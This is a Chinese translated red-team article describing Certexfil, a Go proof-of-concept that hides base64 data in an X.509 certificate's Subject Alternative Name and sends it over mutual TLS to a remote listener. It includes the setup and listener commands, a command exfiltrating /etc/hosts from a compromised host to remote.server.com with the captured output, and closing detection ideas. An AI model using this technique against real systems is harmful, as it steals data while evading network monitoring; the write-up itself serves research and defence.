@@ -1,0 +1,147 @@
+> “当恶意软件和/或恶意行为者从计算机执行未经授权的数据传输时，就会发生数据泄露。” - 维基百科
+
+ **数据泄露可能是内部人员和黑客的主要目标。因此，你就需要思考如何发送这些数据。**
+
+我发现大多数公司对这方面的问题几乎没有什么防护措施（例如，中间人代理和TLS拦截），检测通常也少的可怜......但有时，这可能是一个挑战。
+
+对于工作和业余爱好，我围绕数据混淆和隐蔽通道编写了大量的工具，并总是在为构建更好的安全检测和改善响应时间做努力。
+
+本文我们将讨论如何将数据嵌入到自定义SSL证书中，并通过mTLS针对一个远程侦听服务来使用它。
+
+这是作为POC而写的，也是我在Go中的编写第一个程序。
+
+## 从 TLS 到 mTLS？
+
+TLS（安全传输层协议）是一种加密协议，用于在客户端和服务器之间提供通信安全性。为此，证书颁发机构（“CA”）会为服务器颁发一个签名证书，以向客户端证明其身份。该客户端可以检查证书，并查看签名的CA是否真正受信任。
+
+虽然TLS主要是对服务器进行身份验证，但Mutual TLS添加了客户端的身份验证，该身份验证将由受信任的CA提供签名证书。
+
+## x509 证书滥用
+
+X509证书可以使用主题别名或SAN进行扩展。
+
+![2.jpeg](https://image.3001.net/images/20190708/1562542871_5d22831736623.jpeg!small)
+
+这意味着我们可以在证书创建期间添加字面量（literal）值，这些值可以是从电子邮件，IP到DNS名称的任何内容。
+
+同样，可以在此SAN中添加任何内容，这里并没有真正的验证，只需使用DNS: (.*)的格式即可。
+
+那么，我们是否可以在这个位置隐藏一段我们的payload代码呢？即 **DNS: base64(content)。**
+
+**![3.png](https://image.3001.net/images/20190708/1562543006_5d22839e242c7.png!small)**
+
+## Certexfil
+
+它有三种模式：
+
+> 使用 — ca创建客户端和侦听端都使用的CA架构；
+>
+> 使用 — listen，启动一个mTLS侦听器（你需要来自 — ca的CA文件）
+>
+> 使用 — payload和 — host，将payload（文件，stdout）注入自定义客户端证书，然后立即用它连接到侦听服务。
+
+代码可以在这里找到：<https://github.com/sourcefrenchy/certexfil>
+
+## Certexfil 加密 payload
+
+我使用了一个简单的编码模块对payload进行了base64编码，但在这个阶段似乎没有什么用。显然，我需要在某一点上做些加密，或者我应该将它重命名为encodepayload
+:)。为此，我在go中创建了一个用于加密payload的模块cryptopayload。
+
+代码可以在这里找到：<https://github.com/sourcefrenchy/cryptopayload>
+
+## 用法
+
+ **创建CA/服务器证书**
+
+这将创建包含用于mTLS的server_cert.pem和server_key.pem证书的./CERTS目录（客户端和侦听模式将使用这些目录：
+
+    
+    
+    somewhere$ certexfil -ca -ecdsa-curve P521 -host remote.server.com
+
+现在，请确保你的远程服务器上有certexfil二进制文件和创建的./CERTS目录。然后，启动侦听（默认为：所有接口，tcp/8443）
+
+    
+    
+    remoteserver$ ./certexfil -listen
+
+ **客户端/受妥协主机发送 payload**
+
+在本例中，我们尝试通过生成自定义证书并建立与远程侦听器的mTLS连接，来对我们的“/etc/hosts”文件进行数据泄露，所有这些操作只需下面这一行命令：
+
+    
+    
+    06:52:14 jma@wintermute Go-Workspace → certexfil --host remote.server.com --payload /etc/hosts
+    2019/05/31 18:52:23 [*] Reading from file..
+    2019/05/31 18:52:24 [D] Payload (raw)  --> 127.0.0.1	...(225 bytes)
+    2019/05/31 18:52:24 [D] Payload (Prepare()) --> �...		(173 bytes)
+    2019/05/31 18:52:24 [*] Generated custom cert with payload
+    Oo
+
+我们可以在本地检查创建的新证书（client_cert.pem）和SAN区域中添加的payload（base64）。让我们使用openssl再检查一遍：
+
+    
+    
+    $ openssl x509 -in ./CERTS/client_cert.pem -text -noout 
+     grep -A 5 "Subject Alternative Name"
+                X509v3 Subject Alternative Name: 
+                    DNS:x.io.net, DNS:
+    H4sIAAAAAAAC/0TNMa7DIAwG4DmcwtKbH4IMqcQNunXoBQgxDaoDCJOmx69o08abP1v/r/uTVFJJ3VFylubEVXxMS91tIVYsy1pRiD+4zgg+EaUtxBtQiMhgC8KEHIodqV0LnC+PAZzNb2h5LIzR0Cbk4f9Xs28pj9bdhUeljFHHS8QqvD9wcZZrLujDs3nfMptbopgm5B37L5a0ViwsXgEAAP//pJPCNuEAAAA=    Signature Algorithm: ecdsa-with-SHA512
+             30:81:88:02:42:01:aa:73:a9:af:03:4f:21:16:dd:62:4a:af:
+             59:6b:89:f5:a6:6d:e6:f1:21:40:ff:c8:32:f7:99:4f:d9:c8:
+             7f:b3:ac:43:1f:71:09:86:f4:be:7b:af:93:31:e2:fb:ec:e8:
+
+ **检索侦听端上的 payload**
+
+验证客户端连接提供的证书后，我们可以检索payload，从base64解码并显示它：
+
+    
+    
+    ○ → ./certexfil --listen
+    2019/05/31 22:51:01 [*] Starting listener..
+    2019/05/31 22:52:24 [*] Payload received: H4sIAAAAAAAC/0TNMa7DIAwG4DmcwtKbH4IMqcQNunXoBQgxDaoDCJOmx69o08abP1v/r/uTVFJJ3VFylubEVXxMS91tIVYsy1pRiD+4zgg+EaUtxBtQiMhgC8KEHIodqV0LnC+PAZzNb2h5LIzR0Cbk4f9Xs28pj9bdhUeljFHHS8QqvD9wcZZrLujDs3nfMptbopgm5B37L5a0ViwsXgEAAP//pJPCNuEAAAA=
+    2019/05/31 22:52:24 [*] Payload decoded: 127.0.0.1	localhost
+    127.0.1.1	wintermute
+    # The following lines are desirable for IPv6 capable hosts
+    ::1     ip6-localhost ip6-loopback
+    fe00::0 ip6-localnet
+    ff00::0 ip6-mcastprefix
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+
+## 限制
+
+> tls：的握手消息长度为1399109字节，已超过了最大值65536字节。
+
+> OpenSSL不允许大小超过65536字节的证书
+>
+> TODO：将大型payload拆分为多个证书和/或重新编译OpenSSL
+
+## 缓解措施
+
+假设你已截获并分析SSL流量的一些想法:)
+
+> 检测新创建的TLS证书
+>
+> 检测大型TLS证书或检查SAN以获取有效的DNS条目（例如，你可以使用某些BroIDS脚本）
+>
+> 正确配置Man-in-the-Middle代理/防火墙拦截TLS流量
+
+## 总结
+
+这是一个学习Go的非常好和实用的项目，我仍有一些事情需要做（例如将客户端/侦听程序，大型payload合并到多个证书，添加真正的加密等）。后续我还会继续探索更多其他的Go项目，但不得不说相比之下我更喜欢python。
+
+希望大家能从本文学到一些东西。另外，我也期待来自你们的反馈建议，我很乐意为大家分享我在redteam中的更多有关数据泄露的知识！感谢阅读！
+
+ **参考文献：**
+
+> <https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-> authentication-explained-b2162dec4401>
+>
+> <https://venilnoronha.io/a-step-by-step-guide-to-mtls-in-go>
+>
+> <https://tools.ietf.org/html/draft-ietf-oauth-mtls-14>
+>
+> <https://tools.ietf.org/html/rfc4985>
+
+***参考来源：[medium](https://medium.com/@jeanmichel.amblat/abusing-certificates-for-data-exfiltration-d6bff2533cd0)，FB小编secist编译，转载请注明来自FreeBuf.COM**
+
